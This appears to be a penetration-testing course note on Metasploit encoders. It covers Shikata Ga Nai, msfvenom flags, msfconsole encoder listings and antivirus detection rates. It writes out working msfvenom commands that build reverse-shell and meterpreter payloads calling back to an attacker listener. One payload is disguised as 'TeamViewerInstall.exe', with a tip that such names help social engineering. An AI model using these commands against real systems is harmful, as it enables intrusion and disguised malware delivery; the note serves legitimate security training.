# 07 — Encoders

## Overview

Encoders transform payloads to make them compatible with different processor architectures and to remove **bad characters** (unwanted hexadecimal opcodes). While historically used for AV evasion, modern IPS/IDS signatures have largely caught up — encoders alone are no longer sufficient to bypass detection.

---

## Supported Architectures

| Architecture | Description |
|-------------|-------------|
| `x64` | 64-bit Intel/AMD |
| `x86` | 32-bit Intel/AMD |
| `sparc` | SPARC processors |
| `ppc` | PowerPC |
| `mips` | MIPS processors |

---

## Encoder Purposes

| Purpose | Description |
|---------|-------------|
| **Architecture compatibility** | Transform payload to run on different OS/CPU combos |
| **Bad character removal** | Strip problematic hex opcodes (e.g., `\x00` null bytes) |
| **AV evasion (limited)** | Change payload signature — diminished effectiveness today |

---

## Shikata Ga Nai (SGN)

| Detail | Description |
|--------|-------------|
| **Name** | 仕方がない — "It cannot be helped" |
| **Scheme** | Polymorphic XOR Additive Feedback Encoder |
| **Rank** | `excellent` |
| **Historical use** | Most popular encoding scheme — very hard to detect |
| **Current status** | Modern AV/IDS can detect SGN-encoded payloads |
| **MSF name** | `x86/shikata_ga_nai` |

---

## Historical vs Modern Tools

### Pre-2015 (Deprecated)

```bash
# Separate tools in /usr/share/framework2/
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
> Deprecated. `msfpayload` generated the payload and piped it into `msfencode`. Both tools are gone — use `msfvenom` instead.

### Post-2015 (Current — msfvenom)

```bash
# Combined into msfvenom
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
> `-a x86` sets architecture, `--platform windows` sets OS, `-p` is the payload, `-b` removes null bytes, `-e` specifies the encoder, `-f perl` outputs as Perl shellcode.

---

## msfvenom Encoding Examples

### Without Explicit Encoder (auto-selects based on -b)

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
# Found 11 compatible encoders
# Automatically selects x86/shikata_ga_nai
```
> When you specify `-b` bad characters, msfvenom automatically picks the best compatible encoder. You don't always need `-e`.

### With Explicit Encoder

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
> Explicitly selects `shikata_ga_nai`. Same as above but forces this encoder even if others might score better. Swap `-f perl` for `-f exe` to generate a Windows executable instead.

### Multiple Iterations (`-i`)

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 \
  -o TeamViewerInstall.exe
# Encodes 10 times — payload grows with each iteration
# Still detected by ~52/65 AV engines
```
> `-i 10` runs 10 encoding passes. `-o` writes the output to a file. Using a believable filename like `TeamViewerInstall.exe` helps with social engineering. Note: 10 iterations still gets caught by most AV.

### Key msfvenom Flags for Encoding

| Flag | Description | Example |
|------|-------------|---------|
| `-e` | Encoder to use | `-e x86/shikata_ga_nai` |
| `-i` | Number of encoding iterations | `-i 10` |
| `-b` | Bad characters to avoid | `-b "\x00"` |
| `-f` | Output format | `-f exe`, `-f perl`, `-f raw` |
| `-o` | Output file path | `-o payload.exe` |
| `-a` | Architecture | `-a x86` |
| `--platform` | Target platform | `--platform windows` |

---

## Viewing Encoders in msfconsole

### Show Compatible Encoders (inside an exploit module)

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```
> Set the payload first so MSF knows the architecture, then run `show encoders` to see only compatible options. x64 payloads have fewer encoders than x86.

Encoders are **auto-filtered** to match the current exploit + payload architecture.

### x64 Encoders Example

| Encoder | Rank | Description |
|---------|------|-------------|
| `generic/eicar` | manual | The EICAR Encoder |
| `generic/none` | manual | The "none" Encoder |
| `x64/xor` | manual | XOR Encoder |
| `x64/xor_dynamic` | manual | Dynamic key XOR Encoder |
| `x64/zutto_dekiru` | manual | Zutto Dekiru |

### x86 Encoders Example (more options)

| Encoder | Rank | Description |
|---------|------|-------------|
| `x86/shikata_ga_nai` | excellent | Polymorphic XOR Additive Feedback |
| `x86/call4_dword_xor` | normal | Call+4 Dword XOR |
| `x86/countdown` | normal | Single-byte XOR Countdown |
| `x86/fnstenv_mov` | normal | Variable-length Fnstenv/mov Dword XOR |
| `x86/jmp_call_additive` | normal | Jump/Call XOR Additive Feedback |
| `x86/alpha_mixed` | low | Alpha2 Alphanumeric Mixedcase |
| `x86/alpha_upper` | low | Alpha2 Alphanumeric Uppercase |
| `x86/unicode_mixed` | manual | Alpha2 Alphanumeric Unicode Mixedcase |
| `x86/context_cpuid` | manual | CPUID-based Context Keyed |
| `x86/context_stat` | manual | stat(2)-based Context Keyed |
| `x86/context_time` | manual | time(2)-based Context Keyed |

---

## AV Evasion Reality Check

| Approach | AV Detection Rate | Verdict |
|----------|-------------------|---------|
| SGN × 1 iteration | ~54/69 engines | **Detected** |
| SGN × 10 iterations | ~52/65 engines | **Still detected** |
| Encoding alone | High detection | **Insufficient for modern AV** |

### msf-virustotal — Check Payloads Against AV

```bash
# Requires free VirusTotal API key (register at virustotal.com)
msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe
```
> `-k` takes your VirusTotal API key, `-f` is the file to check. Returns detection counts from 60+ AV engines. Replace `<API_KEY>` with your actual key from virustotal.com.

Returns detection results from 60+ AV engines without manually uploading.

---

## Key Takeaways

| Concept | Remember |
|---------|----------|
| **Encoders ≠ AV evasion** | Modern IDS/IPS detect encoded payloads easily |
| **Primary purpose today** | Architecture compatibility + bad character removal |
| **SGN is not magic anymore** | 仕方がない was dominant — now widely signatured |
| **More iterations ≠ safer** | 10× SGN still detected by ~80% of AV engines |
| **msfvenom replaced msfpayload + msfencode** | Combined tool since 2015 |
| **`show encoders` is context-aware** | Only shows encoders compatible with current exploit + payload |
| **`-b` flag auto-selects encoder** | msfvenom picks best encoder when bad chars specified |
| **Other evasion methods exist** | Custom packers, obfuscators, C2 frameworks (Cobalt Strike, Empire) — beyond this module |
